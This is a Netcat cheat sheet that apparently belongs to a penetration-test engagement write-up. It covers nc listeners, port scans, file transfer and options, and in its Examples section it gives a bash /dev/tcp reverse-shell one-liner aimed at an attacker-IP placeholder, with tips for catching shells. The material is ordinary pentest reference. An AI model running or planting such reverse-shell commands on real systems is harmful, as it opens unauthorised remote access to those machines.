# Netcat Cheat Sheet

> [!NOTE]
> A `/dev/tcp` bash-native reverse shell attempt was made during this engagement (see [07-Privilege-Escalation](../docs/07-Privilege-Escalation/README.md)), but Netcat itself was not directly invoked in the captured notes. This sheet is provided as general reference material since Netcat is the standard companion tool for catching reverse shells.

## Overview

Netcat (`nc`) is a versatile networking utility used for reading/writing data across TCP or UDP connections — commonly used to set up listeners for reverse shells or to perform simple port checks.

## Common Syntax

```bash
nc -lvnp <port>          # listener
nc <target> <port>       # client connection
```

## Useful Commands

| Command | Description |
|---|---|
| `nc -lvnp 4444` | Start a listener on port 4444 |
| `nc <target> <port>` | Connect to a remote listener/service |
| `nc -zv <target> 1-1000` | Basic port scan of a target |
| `nc <target> <port> < file` | Send a file to a remote listener |
| `nc -lvnp 4444 > file` | Receive a file into a local listener |

## Important Options

| Option | Description |
|---|---|
| `-l` | Listen mode (start a listener rather than connect) |
| `-v` | Verbose output |
| `-n` | Skip DNS resolution (numeric IPs only) |
| `-p` | Specify local port to use/listen on |
| `-e` | Execute a program upon connection (not available on all builds; security-restricted on modern distros) |
| `-z` | Zero-I/O mode, useful for simple port scanning |

## Examples

Setting up a listener to catch a reverse shell:

```bash
nc -lvnp 4444
```

Triggering a connection back from a target (paired with a reverse shell payload executed on the target):

```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

## Common Mistakes

- Using a hostname instead of an IP address for the listener target when DNS resolution is unavailable in a restricted network — prefer raw IPs.
- Forgetting that many modern netcat builds do not support `-e` for security reasons — use bash/Python/Perl one-liners instead.
- Not confirming the listener is actually bound and listening (`ss -lntp` / `netstat -lntp`) before triggering the payload on the target.

## References

- [Netcat Manual](https://man.openbsd.org/nc)

## Key Takeaways

- Netcat listeners are the standard receiving end for reverse shell payloads triggered via bash, Python, PHP, or other scripting languages on the target.
- Always confirm network reachability (firewalls, NAT, outbound filtering) before assuming a reverse shell failure is due to a payload issue rather than connectivity.
